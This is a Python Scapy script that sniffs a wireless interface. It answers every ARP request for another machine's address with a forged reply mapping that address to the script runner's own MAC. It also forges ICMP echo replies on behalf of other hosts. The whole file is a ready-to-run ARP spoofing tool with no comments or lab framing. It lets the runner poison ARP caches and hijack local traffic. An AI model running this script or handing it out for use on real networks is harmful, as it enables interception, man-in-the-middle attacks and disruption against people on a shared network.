from scapy.all import *

INTERFACE = "wlan0"
MY_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
MY_IP_ADDRESS = get_if_addr(INTERFACE)

def spoofer(request):
    if request.haslayer('ARP') and request[ARP].op == 1 and request[ARP].pdst != MY_IP_ADDRESS:
        print(f"ARP request from {request[Ether].src} / {request[ARP].psrc} for {request[ARP].pdst}")
        response = Ether()/ARP()

        response[Ether].dst = request[Ether].src
        response[Ether].src = MY_MAC_ADDRESS

        response[ARP].op = 2
        response[ARP].hwsrc = MY_MAC_ADDRESS
        response[ARP].hwdst = request[ARP].hwsrc
        response[ARP].psrc = request[ARP].pdst
        response[ARP].pdst = request[ARP].psrc

        print(f"ARP response as {response[ARP].psrc} with MAC address {response[ARP].hwsrc} to {response[Ether].dst} / {response[ARP].pdst} for {response[ARP].psrc}")
        sendp(response)
    
    elif request.haslayer('ICMP') and request[ICMP].type == 8 and request[IP].dst != MY_IP_ADDRESS :
        print(f"ICMP request from {request[IP].src} to {request[IP].dst}")
        response = Ether()/IP()/ICMP()/""

        response[Ether].dst = request[Ether].src
        response[Ether].src = MY_MAC_ADDRESS

        response[IP].src = request[IP].dst
        response[IP].dst = request[IP].src

        response[ICMP].type = 0
        response[ICMP].id = request[ICMP].id
        response[ICMP].seq = request[ICMP].seq

        response[Raw].load = request[Raw].load

        print(f"ICMP response to {response[IP].dst} as {response[IP].src}")
        sendp(response)

sniff(prn=spoofer, iface=INTERFACE)